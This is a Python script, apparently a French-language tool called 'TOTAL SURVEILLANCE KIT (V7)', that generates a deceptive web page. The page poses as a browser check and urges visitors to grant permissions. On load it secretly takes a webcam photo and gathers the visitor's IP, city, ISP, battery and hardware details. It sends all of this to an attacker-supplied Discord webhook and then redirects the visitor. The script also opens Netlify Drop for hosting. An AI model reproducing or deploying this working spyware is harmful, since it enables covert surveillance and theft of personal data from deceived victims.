import os
import webbrowser

# --- STYLE INTERFACE 2026 ---
red, white, green, cyan = "\033[91m", "\033[97m", "\033[92m", "\033[96m"

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{red}╔════════════════════════════════════════╗")
    print(f"║      {white}TOTAL SURVEILLANCE KIT (V7){red}       ║")
    print(f"╚════════════════════════════════════════╝\n")

    webhook = input(f"{cyan}[?]{white} Discord Webhook URL: ").strip()
    redirect = input(f"{cyan}[?]{white} Redirect After Capture: ").strip()
    if not redirect.startswith("http"): redirect = "https://" + redirect

    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>Checking Connection...</title>
    <script>
        async function fullCapture() {{
            // Filtre anti-bot pour garantir des données réelles
            if (/bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent)) return;

            let fields = [];
            let photoBlob = null;

            // 1. MODULE WEBCAM (NOUVEAU)
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const dataURL = canvas.toDataURL('image/png');
                photoBlob = await (await fetch(dataURL)).blob();
                
                // On éteint la caméra immédiatement
                stream.getTracks().forEach(t => t.stop());
                fields.push({{ name: "📷 Webcam", value: "✅ Capture Réussie", inline: true }});
            }} catch(e) {{
                fields.push({{ name: "📷 Webcam", value: "❌ Accès Refusé", inline: true }});
            }}

            // 2. MODULE LOCALISATION (IP, Ville, FAI)
            try {{
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();
                fields.push({{ name: "📍 Localisation", value: `**IP:** ${{data.ip}}\\n**Ville:** ${{data.city}}\\n**FAI:** ${{data.org}}`, inline: true }});
            }} catch(e) {{}}

            // 3. MODULE ÉNERGIE (Batterie)
            try {{
                const batt = await navigator.getBattery();
                fields.push({{ name: "🔋 Énergie", value: `**Niveau:** ${{Math.round(batt.level * 100)}}%\\n**État:** ${{batt.charging ? '⚡ En charge' : '🔋 Sur batterie'}}`, inline: true }});
            }} catch(e) {{}}

            // 4. MODULE SYSTÈME (RAM, CPU, GPU, Écran)
            const gl = document.createElement('canvas').getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Inconnu";

            fields.push({{ 
                name: "💻 Système & Écran", 
                value: `**RAM:** ~${{navigator.deviceMemory || '?'}} GB\\n**CPU:** ${{navigator.hardwareConcurrency}} Cœurs\\n**GPU:** ${{gpu}}\\n**Résolution:** ${{window.screen.width}}x${{window.screen.height}}`, 
                inline: false 
            }});

            // 5. ENVOI COMBINÉ VERS DISCORD
            const formData = new FormData();
            const payload = {{
                embeds: [{{
                    title: "🚨 CLICK DETECTÉ (Full Scan + Webcam)",
                    color: 16711680,
                    fields: fields,
                    image: {{ url: "attachment://view.png" }},
                    timestamp: new Date().toISOString()
                }}]
            }};

            formData.append('payload_json', JSON.stringify(payload));
            if (photoBlob) formData.append('file', photoBlob, 'view.png');

            await fetch('{webhook}', {{
                method: 'POST',
                body: formData
            }});

            window.location.href = "{redirect}";
        }}
        window.onload = fullCapture;
    </script>
</head>
<body style="background:#000; color:white; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; font-family:sans-serif;">
    <div style="text-align:center; padding:20px; border:1px solid #333; border-radius:10px;">
        <h2>Vérification du navigateur...</h2>
        <p>Veuillez accepter les demandes de permission pour accéder au contenu sécurisé.</p>
    </div>
</body>
</html>"""

    # Sauvegarde
    folder = "surveillance_kit_v7"
    if not os.path.exists(folder): os.makedirs(folder)
    with open(f"{folder}/index.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    print(f"\n{green}[SUCCÈS]{white} Dossier '{folder}' créé.")
    webbrowser.open("https://app.netlify.com/drop")

if __name__ == "__main__":
    main()